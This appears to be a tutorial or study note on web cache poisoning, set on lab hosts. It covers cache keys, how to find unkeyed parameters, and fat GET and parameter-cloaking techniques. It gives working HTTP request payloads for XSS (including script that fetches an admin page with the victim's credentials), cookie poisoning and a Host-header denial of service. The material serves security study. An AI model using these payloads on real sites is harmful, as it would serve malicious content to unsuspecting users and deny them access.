# Web Cache Poisoning
- [Overview](#overview)
- [Identifying Unkeyed Parameters](#identifying-unkeyed-parameters)
    - [Unkeyed GET Parameters](#unkeyed-get-parameters)
    - [Unkeyed Headers](#unkeyed-headers)
- [Web Cache Poisoning Attacks](#web-cache-poisoning-attacks)
    - [XSS](#xss)
    - [Unkeyed Cookies](#unkeyed-cookies)
    - [Denial-of-Service](#denial-of-service)
- [Advanced Cache Poisoning Techniques](#advanced-cache-poisoning-techniques)
    - [Fat GET](#fat-get)
    - [Parameter Cloaking](#parameter-cloaking)
- [Cache Busters](#cache-busters)
- [Remarks](#remarks)


## Overview
- Web Caches are located between the client and the server and serve content from their local storage instead of requesting it from the web server. If a client requests a resource that is not stored in the web cache, the resource will be requested from the web server. 

- The web cache then stores the resource locally and is thus able to respond to any future requests for that resource without requesting it from the web server. 
- Web caches typically store resources for a limited time window to allow changes to propagate once the cache has been refreshed.
- Web cache poisoning is an advanced attack vector that forces a web cache to serve malicious content to unsuspecting users visiting the vulnerable site.
-  By exploiting web cache poisoning, an attacker may be able to deliver malicious content to a vast number of users.

- Web caches use a subset of all request parameters to determine whether requests should be served the same response. This subset is called Cache Key. 

> [!NOTE]
> In most default configurations, this includes the request path, the GET parameters, and the Host header. However, cache keys can be configured individually to include or exclude any HTTP parameters or headers 

- All parameters that are part of the cache key are called keyed, while all other parameters are unkeyed

## Identifying Unkeyed Parameters
- In a web cache poisoning attack, we want to force the web cache to serve malicious content to other users. To do so, we need to identify unkeyed parameters that we can use to inject a malicious payload into the response. 
- The parameter to deliver the payload must be unkeyed since keyed parameters need to be the same when the victim accesses the resource. 
- This would mean the victim has to send the malicious payload themselves, effectively resulting in a scenario similar to reflected XSS.
- As an example, consider a web application that is vulnerable to reflected XSS via the ref parameter. It supports multiple languages in a language parameter. Let's also assume that the `ref` parameter is unkeyed, while the `language` parameter is keyed. In this case, we can deliver the payload using the URL `/index.php?language=en&ref="><script>alert(1)</script>`. If the web cache then stores the response, we successfully poisoned the cache, meaning all subsequent users that request the resource `/index.php?language=en` get served our XSS payload. 

> [!NOTE]
> If the ref parameter was keyed, the victim's request would result in a different cache key, thus the web cache would not serve the poisoned response.

- **Unkeyed request parameters can be identified by observing whether we were served a cached or fresh response.** 
### Unkeyed GET Parameters
- There are demonstrated test cases to determine keyed and unkeyed parameters:
    1. - Request to `/index.php?language=test&content=HelloWorld` results in a cache miss
       - The same request to `/index.php?language=test&content=HelloWorld` results in a cache hit
       - Request to `/index.php?language=test&content=SomethingDifferent` results in a cache miss again
       - Since the third request triggers a cache miss, we can deduce that the cache key was different from the first two requests. However, since only the content parameter is different, it has to be keyed. Therefore, both the language and content parameters are keyed, so no luck here.

    2. - Request to `/index.php?language=valuewedidnotusebefore&ref=test123` results in a cache miss
       - The same request to `/index.php?language=valuewedidnotusebefore&ref=test123` results in a cache hit
       - Request to `/index.php?language=valuewedidnotusebefore&ref=Hello` also results in a cache hit
       - This time, the third request also triggers a cache hit. Since the `ref` parameter is different, however, we know that it has to be unkeyed. Now we need to find out whether we can inject a malicious payload via the ref parameter.
       - Exploitation: 
       ```http
       GET /index.php?language=unusedvalue&ref="><script>alert(1)</script> HTTP/1.1
       Host: webcache.htb
       ```

> [!NOTE]
> Remember to use a value for the language parameter that was never used before to avoid receiving a cached response.

### Unkeyed Headers
- Similarly to unkeyed GET parameters, it is quite common to find unkeyed HTTP headers that influence the response of the web server. 
- We can apply the same methodology from before to determine that header is unkeyed. Since the header is reflected without sanitization, we can also use it to exploit an XSS vulnerability. We can thus use the header to deliver the same payload as before with the following request:
```http
GET /index.php?language=de HTTP/1.1
Host: webcache.htb
X-Backend-Server: testserver.htb"><img src=x onerror=alert(2)>
```

## Web Cache Poisoning Attacks

> [!IMPORTANT]
> Usually, when we request a page it is most likely already cached and we are only served the cached response.
> In these cases, we need to send our malicious request at the exact time that the cache expires to get the web cache to store the response. 
> Getting this timing right involves a lot of trial and error. However, it can be significantly easier if the web server reveals information about the expiry of the cache.

### XSS 
- Like the previous example that I mentioned. Furthermore, we have seen that an XSS vulnerability via an unkeyed HTTP header that was unexploitable on its own can be weaponized with the help of web cache poisoning.

### Unkeyed Cookies
- If a web application utilizes a user cookie to remember certain user choices and this cookie is unkeyed, it can be used to poison the cache and force these choices upon other users.
- For instance, assume the cookie `consent` is used to remember if the user consented to something being displayed on the page. If this cookie is unkeyed, an attacker could send the following request:
```http
GET /index.php HTTP/1.1
Host: webcache.htb
Cookie: consent=1;
```
- If the response is cached, all users that visit the website are served the content as if they already consented.

### Denial-of-Service
- We can think of a scenario where web cache poisoning can lead to a Denial-of-Service (DoS) attack. 
- Consider a setting where a faulty web cache is used that includes the host header in its cache key but applies normalization before caching by stripping the port. The underlying web application then uses the host header to construct an absolute URL for a redirect. A request similar to this:
```http
GET / HTTP/1.1
Host: webcache.htb:80
```
- would result in a response like this:
```http
HTTP/1.1 302 Found
Location: http://webcache.htb:80/index.php
```
- While the port is present in the response, it is not considered part of the cache key due to the flawed behavior of the web cache. This means we could achieve a DoS by sending a request like this:
```http
GET / HTTP/1.1
Host: webcache.htb:1337
```
- If the response is cached, all users that try to access the site are redirected to port 1337. Since the web application runs on port 80 however, the users are unable to access the site.

> [!NOTE]
> If certain HTTP headers such as the `User-Agent` are included in the cache key, an attacker needs to poison the cache for each target group separately, since the web cache will serve different cached responses for different User-Agents.

## Advanced Cache Poisoning Techniques
### Fat GET
- Fat GET requests are HTTP GET requests that contain a request body. Since GET parameters are by specification sent as part of the query string, it might be weird to think that GET requests can contain a request body.
- However, any HTTP request can contain a request body, no matter what the method is. In the case of a GET request, the message body has no meaning which is why it is never used.

- Therefore, a request body is explicitly allowed, however, it should not have any effect. Thus, the following two GET requests are semantically equivalent, as the body should be neglected on the second:
```http
GET /index.php?param1=Hello&param2=World HTTP/1.1
Host: fatget.wcp.htb

```
```http
GET /index.php?param1=Hello&param2=World HTTP/1.1
Host: fatget.wcp.htb
Content-Length: 10

param3=123
```
- If the web server is misconfigured or implemented incorrectly, it may parse parameters from the request body of GET requests though, which can lead to web cache poisoning attack vectors that would otherwise be unexploitable.

- Example:
    - After confirming that the reflected XSS vulnerability in the following `ref` parameter that still present, we can use web cache poisoning to escalate this into a stored XSS vulnerability:
    ```http
    GET /index.php?language=de HTTP/1.1
    Host: fatget.wcp.htb
    Content-Length: 142

    ref="><script>var xhr = new XMLHttpRequest();xhr.open('GET', '/admin.php?reveal_flag=1', true);xhr.withCredentials = true;xhr.send();</script>
    ```
    - This should poison the cache for us. We can confirm this by sending the following request. We can see that we get a cache hit and the response contains our poisoned payload:
    ![fatGet](/images/wcp_fatget.jpg)


> [!NOTE]
> fat GET requests are typically a misconfiguration in the web server software, not in the web application itself.

### Parameter Cloaking
- Just like with fat GET requests, the goal is to create a discrepancy between the web server and the web cache in a way that the web cache uses a different parameter for the cache key than the web server uses to serve the response. The idea is thus the same as with fat GET requests.

- To do so we need an unkeyed parameter. In this case, we can assume that the parameter `a` is unkeyed:
```http
GET /?language=en&a=b;language=de HTTP/1.1
Host: cloak.wcp.htb
```
- The response displays the German text, although the request contains the parameter `language=en`. 
- The web cache sees two GET parameters: `language` with the value `en` and `a` with the value `b;language=de`. On the other hand, Bottle sees three parameters: `language` with the value `en`, `a` with the value `b`, and `language` with the value `de`
- Since Bottle prefers the last occurrence of each parameter, the value de overrides the value for the language parameter. Thus, Bottle serves the response containing the German text. 
- Since the parameter `a` is unkeyed, the web cache stores this response for the cache key `language=en`. 

> [!IMPORTANT]
> Since Bottle treats the semicolon as a separation character, we need to URL-encode all occurrences of the semicolon in our payload:
> ```http
> GET /?language=de&a=b;ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest()%3bxhr.open(%27GET%27,%20%27/admin?reveal_flag=1%27,%20true)%3bxhr.withCredentials%20=%20true%3bxhr.send()%3b%3C/script%3E HTTP/1.1
> Host: cloak.wcp.htb
> ```


> [!NOTE]
> To poison the cache with parameter cloaking we need to "hide" the cloaked parameter from the cache key by appending it to an unkeyed parameter.


## Cache Busters
- In real-world scenarios, we have to ensure that our poisoned response is not served to any real users of the web application. We can achieve this by adding a cache buster to all of our requests.
- A cache buster is a unique parameter value that only we use to guarantee a unique cache key. Since we have a unique cache key, only we get served the poisoned response and no real users are affected.

- As an example, let's revisit the web application from the previous section. We know that the admin user is German and thus visits the website using the `language=de` parameter. 
- To ensure that he does not get served a poisoned response until we completed our payload, we should use a cache buster in the language parameter to guarantee that we don't affect the admin user. 
- For instance, when we determined that the `ref` parameter is unkeyed, we built a proof of concept for the XSS. We did this using the following request:
```http
GET /index.php?language=unusedvalue&ref="><script>alert(1)</script> HTTP/1.1
Host: webcache.htb

```
- Since the value we sent in the language parameter is a unique value that no real user would ever set, it is our cache buster.

> [!IMPORTANT]
> Keep in mind that we have to use a different cache buster in a follow-up request, as the cache key with the `language=unusedvalue` parameter already exists due to our previous request. 
> So, we would have to adjust the value of the language parameter slightly to get a new unique and unused cache key.

## Remarks
- One of the hardest parts about web cache poisoning is to ensure that a response is cached. When many users use a website, it is unlikely that the cache is empty when we send our malicious payload, meaning we are served an already cached response and our request never hits the web server.

- We can try to bypass the web cache by setting the `Cache-Control: no-cache header` in our request. Most caches will respect this header in the default configuration and will check with the web server before serving us the response. 
- This means we can force our request to hit the web server even if there is a cached entry with the same cache key. If this does not work, we could also try the deprecated `Pragma: no-cache` header.

- However, these headers cannot be used to force the web cache to refresh the stored copy. To force our poisoned response to be cached, we need to wait until the current cache expires and then time our request correctly for it to be cached. 
- This involves a lot of guesswork. However, in some cases, the server informs us about how long a cached resource is considered fresh. We can look for the `Cache-Control` header in the response to check how many seconds the response remains fresh.



## Resources
- [Chaining-cache-poisoning-to-stored-xss](https://nahoragg.medium.com/chaining-cache-poisoning-to-stored-xss-b910076bda4f)
- [Web-cache-poisoning-worth-it](https://yaseenzubair.medium.com/web-cache-poisoning-worth-it-e7c6d88797b1) 
- [sensitive-information-disclosure-web-cache...](https://medium.com/@dr.spitfire/sensitive-information-disclosure-web-cache-deception-attack-bcac6cb9cd86)  
- https://infosecwriteups.com/how-i-made-16-500-hacking-cdn-caching-servers-part-2-4995ece4c6e6
- https://book.hacktricks.xyz/pentesting-web/cache-deception
- https://youst.in/posts/cache-poisoning-at-scale/
- https://portswigger.net/research/practical-web-cache-poisoning
- Black Hat: [• Web Cache Deception Attack](https://www.youtube.com/watch?v=mroq9eHFOIU&t=0s)
- Black Hat: [• Practical Web Cache Poisoning](https://www.youtube.com/watch?v=j2RrmNxJZ5c&t=0s) 
